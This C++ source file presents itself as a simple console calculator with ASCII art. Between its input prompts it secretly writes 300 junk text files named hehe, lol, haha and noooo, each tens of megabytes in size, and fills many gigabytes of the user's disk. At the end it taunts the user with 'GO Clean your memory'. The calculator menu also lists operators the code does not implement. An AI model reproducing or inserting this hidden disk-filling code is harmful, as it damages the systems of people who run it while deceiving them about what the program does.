#include <iostream>
#include <fstream>
#include <windows.h>
using namespace std;

int main()
{

    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 4); // red font
    cout<<"Created By nameer khan"<<endl;
    
    
    cout << " _____________________" << endl;
    cout << "|  _________________  |" << endl;
    cout << "| | HEHE         0. | |" << endl;
    cout << "| |_________________| |" << endl;
    cout << "|  ___ ___ ___   ___  |" << endl;
    cout << "| | 7 | 8 | 9 | | + | |" << endl;
    cout << "| |___|___|___| |___| |" << endl;
    cout << "| | 4 | 5 | 6 | | - | |" << endl;
    cout << "| |___|___|___| |___| |" << endl;
    cout << "| | 1 | 2 | 3 | | x | |" << endl;
    cout << "| |___|___|___| |___| |" << endl;
    cout << "| | . | 0 | = | | / | |" << endl;
    cout << "| |___|___|___| |___| |" << endl;
    cout << "|_____________________|" << endl;
    cout << endl;

    cout << "CONSOLE CALCULATOR THAT CALCULATE YOUR EVERY ISSUE " << endl;

    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 2); // red font
    cout << endl;
    cout << "________________PLEASE ENJOY ________________ " << endl;
    
    cout<<endl;
    cout<<endl;
	cout<<"Please Use it in FULL screen it tried to Add animation as well"<<endl;
	cout<<endl;
	cout<<endl;
	
	
    cout << "*It might runs slow but stay patience (Not a good coder T_T ) *" << endl;
    string st;
  
    // cout<<"Use it on FULL Screen Mode"<<endl;
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 7); // white font
    double num1, num2;
    char op;

    const int largeStringSize = 1000000; // 1 million characters

    // Create a string containing the entire ASCII printable character set
    string largeString;
    for (int i = 32; i <= 126; ++i)
    {
        largeString += static_cast<char>(i);
    }

    // Extend the string to reach the desired size
    while (largeString.size() < largeStringSize)
    {
        largeString += largeString;
    }
	cout << "Simple Console Calculator" << endl;
    cout << "Enter first number: ";
    cin >> num1;
    for (int i = 0; i < 100; i++)
    {

        
        fstream file;
        file.open("hehe" + to_string(i) + ".txt", ios::out); // Open the file in output mode

        if (file.is_open())
        {
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator

            file.close(); // Close the file after writing
                          // cout << "Data written to the file." <<i+1<<"Times"<< endl;
        }
        else
        {
            // cout << "Failed to open the file." << endl;
        }
    }
   
    cout << "Enter operator (+, -, *, /, =, ≠ ,mod, a^b , √a, 3√a , 4√a, ‰ ,%, ≅ ): ";
    cin >> op;
    cout << "Enter second number: ";
    cin >> num2;

    for (int i = 0; i < 25; i++)
    {

        
        fstream file;
        file.open("lol" + to_string(i) + ".txt", ios::out); // Open the file in output mode

        if (file.is_open())
        {

            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator

            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator

            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator

            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator

            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator

            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator

            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator

            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file.close();        // Close the file after writing
                                 // cout << "Data written to the file." <<i+1<<"Times"<< endl;
        }
        else
        {
            // cout << "Failed to open the file." << endl;
        }
    }

    for (int i = 0; i < 50; i++)
    {


        fstream file;
        file.open("haha" + to_string(i) + ".txt", ios::out); // Open the file in output mode

        if (file.is_open())
        {
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator

            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator

            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator

            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator

            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator

            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator

            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator

            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator

            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator

            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator

            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator

            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator

            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator

            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator

            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator

            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator

            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator

            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator

            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator

            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file.close();        // Close the file after writing
                                 // cout << "Data written to the file." <<i+1<<"Times"<< endl;
        }
        else
        {
            // cout << "Failed to open the file." << endl;
        }
    }
    double result;
    bool validOperator = true;

    switch (op)
    {
    case '+':
        result = num1 + num2;
        break;
    case '-':
        result = num1 - num2;
        break;
    case '*':
        result = num1 * num2;
        break;
    case '/':
        if (num2 != 0)
        {
            result = num1 / num2;
        }
        else
        {
            cout << "Error: Division by zero!" << endl;
            validOperator = false;
        }
        break;
    default:
        cout << "Error: Invalid operator!" << endl;
        validOperator = false;
    }
    int choice;
    if (validOperator)
    {
        cout << "Result: " << result << endl;
        cout << "Wanna see something else ?choice 1,2 " << endl;
        cin >> choice;
    }

    for (int i = 0; i < 125; i++)
    {

        
        fstream file;
        file.open("noooo" + to_string(i) + ".txt", ios::out); // Open the file in output mode

        if (file.is_open())
        {
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator
            file << largeString; // Write the string to the file using the stream insertion operator

            file.close(); // Close the file after writing
             SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 4); // red font
            cout<<" im sorry "<<endl;
            cout<<"GO Clean your memory"<<endl;
            cout << "_______________________                _______________________" << endl;
            cout << "         |    |                                 |    |        " << endl;
            cout << "         |    |                                 |    |        " << endl;
            cout << "         |    |                                 |    |        " << endl;
            cout << "         |    |                                 |    |        " << endl;
            cout << "         |    |                                 |    |        " << endl;
            cout << "         |    |                                 |    |        " << endl;
            cout << "         |    |                                 |    |        " << endl;
            cout << "         |    |                                 |    |        " << endl;
            cout << "         |    |        ________________         |    |        " << endl;
            cout<<endl;
            cout<<endl;
        }
        else
        {
            // cout << "Failed to open the file." << endl;
        }
    }

    return 0;
}
